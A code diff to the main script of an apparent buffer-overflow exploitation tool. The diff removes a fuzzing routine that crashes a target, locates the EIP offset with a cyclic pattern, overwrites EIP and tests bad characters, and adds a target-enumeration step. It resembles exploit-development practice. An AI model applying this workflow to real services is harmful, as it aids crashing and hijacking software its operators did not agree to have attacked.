@@ -1,18 +1,14 @@
 #!/usr/bin/python3
 
 from get_args import input_args
-from fuzzer import Fuzz
 from target import Target
 import sys
 from IPy import IP
 from create_pattern import Pattern
-from bad_characters import bad_characters
+from enum_target import Enum
 
 
 class Main:
-
-    def __init__(self):
-        self.pattern = Pattern()
 
     def main(self):
         args = input_args()
@@ -25,76 +21,19 @@ class Main:
                            'path': args.path}
 
             target = Target(target_dict)
-            fuzz = Fuzz(target)
 
-            if args.eip:
-                fuzz.confirm_eip(args.eip)
-                sys.exit()
+            if args.enum:
+                enum = Enum()
+                target = enum.enumerate(args, target)
+            else:
+                pass
+                # pwn module here
 
-            fuzz_length = args.len if args.len else 100
-
-            # bytes to crash program
-            crash_bytes = fuzz.find_crash(fuzz_length)
-            print(f"[*] Program crashed at {crash_bytes} bytes...\n")
-
-            pat = self.get_pattern(crash_bytes)
-
-            print("[*] Pattern created\n")
-
-            # Reset application
-
-            print("[!] Waiting for application to restart.\n")
-            fuzz.is_target_up()
-
-            # Send pattern to application to identify EIP overwrite
-            fuzz.locate_eip(pat)
-
-            # Get EIP value from user
-            eip_query = input("[*] Enter EIP Value: ")
-
-            print("[!] Waiting for application to restart.\n")
-            fuzz.is_target_up()
-            
-            # Determine EIP offset
-            offset = self.get_offset(eip_query)
-            
-            print(f"[*] Offset detected at {offset} bytes\n")
-
-            print("[*] Targeting EIP with all 'B's...\n")
-            fuzz.send_payload("A" * offset + "B" * 4)
-
-            print("[!] Waiting for application to restart.\n")
-            fuzz.is_target_up()
-
-            print("[*] Sending all chars for bad char check...\n")
-            fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())
-            
-            print("[!] Waiting for application to restart.\n")
-            fuzz.is_target_up()
-
-            print("[*] Sending buffer + 4 * 'B' + 390 * 'C'\n")
-            fuzz.send_payload("A" * offset + "B" * 4 + "C" * 390)
-            
-            # Get user input
-            # Build and send generic test payload hail mary
-            
-            # Exit
             sys.exit()
 
         else:
             print("Invalid Arguments")
             sys.exit()
-
-    def get_pattern(self, crash_bytes):
-        # Create pattern from crash bytes plus 300 byte padding
-        return self.pattern.create_pattern(crash_bytes + 300)
-
-    def get_offset(self, eip_query):
-        # Find position of EIP query in string
-        # NOTE: Decodes EIP hex to ascii before passing
-        # Reverses result due to little endianness
-        clear_text = bytearray.fromhex(eip_query).decode()[::-1]
-        return self.pattern.find_offset(clear_text)
 
 
 if __name__ == "__main__":
